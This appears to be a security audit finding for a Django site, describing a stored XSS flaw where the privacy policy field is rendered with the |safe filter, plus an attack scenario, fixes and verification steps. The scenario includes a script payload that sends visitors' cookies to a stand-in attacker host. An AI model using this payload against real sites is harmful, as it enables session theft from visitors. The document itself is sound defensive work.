# B03 XSS via Unsafe Rendering of Privacy Policy Content

**Severity:** HIGH
**File:** `templates/pages/privacy_policy.html:9`
**Type:** XSS (Cross-Site Scripting)

## Description

`templates/pages/privacy_policy.html` line 9 renders `page.privacy_policy_content` with Django's `|safe` filter:

```django
{{ page.privacy_policy_content|safe }}
```

The `|safe` filter disables Django's automatic HTML escaping for the value. The backing field is `HomePage.privacy_policy_content`, a plain `TextField` (models.py line 326) with no sanitisation applied on write:

```python
privacy_policy_content = models.TextField(null=True, blank=True)
```

Whatever is stored in this field is emitted verbatim into the page's HTML. If the field contains `<script>` tags or inline event handlers, they execute in every visitor's browser.

The threat is realistic because:
- The field is edited through the Django admin, which is accessible to any staff/superuser account.
- Admin accounts can be compromised (credential stuffing, phishing, reused passwords).
- An admin might paste content copied from an external source (a Word document, another website, a CMS export) that contains embedded scripts without noticing.
- There is no Content Security Policy blocking inline scripts, so execution is not mitigated at the browser level.

## Attack Scenario

1. Attacker gains access to a Django admin account (credential compromise, or a malicious insider).
2. Attacker navigates to the `HomePage` admin change form and edits the `privacy_policy_content` field, inserting a payload such as:
   ```html
   <script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
   ```
3. Attacker saves the record. No validation rejects it — it is a plain `TextField`.
4. Every visitor who loads `/privacy-policy/` (or whatever URL renders this template) silently executes the payload in their browser.
5. Session cookies, authentication tokens, or any data accessible to JavaScript are exfiltrated to the attacker's server.
6. The attack persists until an admin manually removes the payload, and there is no automated detection.

## Fix Plan

Replace `|safe` with Django's `bleach`-based sanitisation, or use the `django-bleach` template filter, which strips disallowed tags while keeping safe formatting HTML like `<p>`, `<strong>`, `<ul>`, etc.

**Option A — preferred: use `django-bleach`**

Install the package:
```
pip install django-bleach
```

Add to `INSTALLED_APPS` in settings:
```python
'django_bleach',
```

Configure allowed tags (add to settings.py):
```python
BLEACH_ALLOWED_TAGS = [
    'p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'h2', 'h3', 'h4', 'a', 'span',
]
BLEACH_ALLOWED_ATTRIBUTES = {'a': ['href', 'title', 'rel']}
BLEACH_STRIP_TAGS = True
```

Update the template (`templates/pages/privacy_policy.html` line 2 and line 9):

Before:
```django
{% load i18n %}
...
{{ page.privacy_policy_content|safe }}
```

After:
```django
{% load i18n bleach_tags %}
...
{{ page.privacy_policy_content|bleach }}
```

**Option B — minimal, no new dependency: strip all tags**

If rich HTML formatting is not needed in the field:

Before:
```django
{{ page.privacy_policy_content|safe }}
```

After:
```django
{{ page.privacy_policy_content }}
```

Removing `|safe` re-enables Django's auto-escaping, which converts `<`, `>`, `"`, `'`, and `&` to HTML entities. All tags are rendered as visible text rather than executed. Plain newlines can be preserved with `|linebreaks` or `|linebreaksbr`:

```django
{{ page.privacy_policy_content|linebreaks }}
```

## Verification

1. In the Django admin, set `privacy_policy_content` to:
   ```
   <script>alert('XSS')</script>Hello
   ```
2. Load the privacy policy page in a browser.
3. **Before fix:** an alert dialog appears (script executed).
4. **After fix (Option B):** the literal text `<script>alert('XSS')</script>Hello` is displayed as escaped text, and no dialog appears.
5. **After fix (Option A):** only `Hello` is displayed; the `<script>` tag is stripped entirely.
6. Confirm with browser DevTools that no `<script>` tag appears in the rendered DOM.
